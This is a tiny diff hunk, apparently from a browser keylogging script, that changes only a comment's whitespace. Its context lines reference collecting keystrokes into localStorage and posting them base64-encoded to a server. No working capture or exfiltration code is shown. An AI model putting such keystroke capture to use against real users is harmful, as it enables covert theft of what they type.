@@ -6,7 +6,7 @@
             //gum_postkeylogs();
         and
             browserinfo['keylogs'] = b64ens(request.forms.keylogs)
- */
+*/
 if (!('gum_keyslog' in window.localStorage)){
     window.localStorage.setItem('gum_keyslog', '')
 };
